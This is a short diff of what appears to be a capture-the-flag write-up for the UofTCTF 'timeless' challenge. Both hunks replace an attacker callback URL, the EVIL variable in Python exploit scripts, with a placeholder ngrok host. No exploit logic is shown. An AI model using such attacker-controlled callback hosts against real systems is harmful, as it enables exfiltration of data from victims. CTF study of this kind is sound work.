@@ -578,7 +578,7 @@ import requests
 
 # URL = "https://timeless-280e8f94de4a3a53.chal.uoftctf.org/"
 URL = "http://localhost:5000/"
-EVIL = "https://tchenio.ngrok.io/"
+EVIL = "https://xxx.ngrok.app/"
 
 s = requests.session()
 user = {
@@ -744,7 +744,7 @@ import uuid
 
 # URL = "https://timeless-280e8f94de4a3a53.chal.uoftctf.org/"
 URL = "http://localhost:5000/"
-EVIL = "https://tchenio.ngrok.io/"
+EVIL = "https://xxx.ngrok.app/"
 
 s = requests.session()
 user = {
